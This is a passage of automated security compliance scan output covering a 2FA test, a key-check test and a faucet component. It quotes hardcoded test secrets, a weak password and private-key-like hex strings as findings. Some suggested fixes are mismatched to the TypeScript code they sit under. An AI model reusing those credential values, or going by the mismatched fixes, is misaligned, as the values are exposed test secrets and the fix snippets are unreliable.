"High"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/api/2fa.test.ts`
**Scanned at**: 2026-10-11T16:33:56.430985+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (2)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 182 |
| 🔴 CRITICAL | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing | 181 |

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Potential hardcoded secret detected
```ts
// Line 182
const secret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
// Line 214
const secret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
// Line 240
const secret = 'KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7'
```
**Suggested fix:**
```ts
# Suggested fix: store secrets in environment variables, never in code
import os
API_KEY = os.environ['API_KEY']        # Python
# const apiKey = process.env.API_KEY   # Node.js
# $apiKey = getenv('API_KEY');          # PHP
# Use Azure Key Vault, HashiCorp Vault, or AWS Secrets Manager in production.
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

#### [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) — Hardcoded password literal detected
```ts
// Line 181
const password = '123456'
// Line 213
const password = '123456'
// Line 239
const password = '123456'
```
**Suggested fix:**
```ts
# Suggested fix: load passwords from environment, hash with bcrypt
import os, bcrypt
# Never store plain-text passwords
password_hash = bcrypt.hashpw(os.environ['USER_PASSWORD'].encode(), bcrypt.gensalt())
# Verify: bcrypt.checkpw(supplied_password.encode(), password_hash)
```
> 💡 **Why**: Risk: If a password database is breached, using weak or unsalted hashes (like MD5 or SHA1) allows attackers to use 'rainbow tables' to crack millions of passwords in seconds. Strong KDFs make this computationally infeasible.
> 🔧 **Guidance**: A developer must refactor the authentication code to use a modern, approved library for password hashing (e.g., `spring-security-crypto`) and not use deprecated functions like `java.security.MessageDigest.getInstance("MD5")`.
> [Full remediation →](https://verify.example-org.internal/?id=AUTH-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |

_+ 54 more applicable mandards — [view all 62 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 182, "message": "Potential hardcoded secret detected", "fix_snippet": "# Suggested fix: store secrets in environment variables, never in code\nimport os\nAPI_KEY = os.environ['API_KEY']        # Python\n# const apiKey = process.env.API_KEY   # Node.js\n# $apiKey = getenv('API_KEY');          # PHP\n# Use Azure Key Vault, HashiCorp Vault, or AWS Secrets Manager in production."}, {"mandard_id": "AUTH-M-001", "severity": "CRITICAL", "line": 181, "message": "Hardcoded password literal detected", "fix_snippet": "# Suggested fix: load passwords from environment, hash with bcrypt\nimport os, bcrypt\n# Never store plain-text passwords\npassword_hash = bcrypt.hashpw(os.environ['USER_PASSWORD'].encode(), bcrypt.gensalt())\n# Verify: bcrypt.checkpw(supplied_password.encode(), password_hash)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/api/checkKeys.test.ts`
**Scanned at**: 2026-10-11T16:33:56.710208+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 35 |

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Hardcoded credential in named variable detected
```ts
// Line 35
.send({ privateKey: 'lalalala' })
// Line 46
.send({ privateKey: '0x02c7a2a93289c9fbda5990bac6596993e9bb0a8d3f178175a80b7cfd983983f506' })
// Line 57
.send({ privateKey: '0x8343d2eb2B13A2495De435a1b15e85b98115Ce05' })
```
**Suggested fix:**
```ts
# Suggested fix: load all credentials from environment variables or a vault
import os
JWT_SECRET = os.environ['JWT_SECRET']          # Python
// const jwtSecret = process.env.JWT_SECRET;   // Node.js
# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [CRYPT-M-001](https://verify.example-org.internal/?id=CRYPT-M-001) | Encryption at Rest |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AJAX-M-001](https://verify.example-org.internal/?id=AJAX-M-001) | AJAX Request Validation & CSRF Protection |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 35, "message": "Hardcoded credential in named variable detected", "fix_snippet": "# Suggested fix: load all credentials from environment variables or a vault\nimport os\nJWT_SECRET = os.environ['JWT_SECRET']          # Python\n// const jwtSecret = process.env.JWT_SECRET;   // Node.js\n# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `frontend/src/app/faucet/faucet.component.ts`
**Scanned at**: 2026-10-11T16:33:59.590129+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [LOG-M-001](https://verify.example-org.internal/?id=LOG-M-001) | Stream Logs to SIEM | 239 |

#### [LOG-M-001](https://verify.example-org.internal/?id=LOG-M-001) — Sensitive data logged to console
```ts
// Line 239
console.log('BEE tokens extracted successfully')
```
**Suggested fix:**
```ts
// Suggested fix: never log credentials — log a masked reference instead
// WRONG:  console.log('Auth', password, apiKey);
const logger = require('./logger');  // structured logger (e.g. winston, pino)
logger.info('Auth attempt', { userId, tokenPresent: !!apiKey });  // mask value
```
> 💡 **Why**: Risk: Without centralized logging, it is impossible to perform effective incident response. If an attacker breaches an application, the logs on the compromised server will be the first thing they delete.
> 🔧 **Guidance**: Mask or redact secrets in CI output, avoid echoing environment variables, and configure log retention/access controls. Invalidate any secret discovered in logs.
> [Full remediation →](https://verify.example-org.internal/?id=LOG-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "LOG-M-001", "severity": "HIGH", "line": 239, "message": "Sensitive data logged to console", "fix_snippet": "// Suggested fix: never log credentials \u2014 log a masked reference instead\n// WRONG:  console.log('Auth', password, apiKey);\nconst logger = require('./logger');  // structured logger (e.g. winston, pino)\nlogger.info('Auth attempt', { userId, tokenPresent: !!apiKey });  // mask value"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, 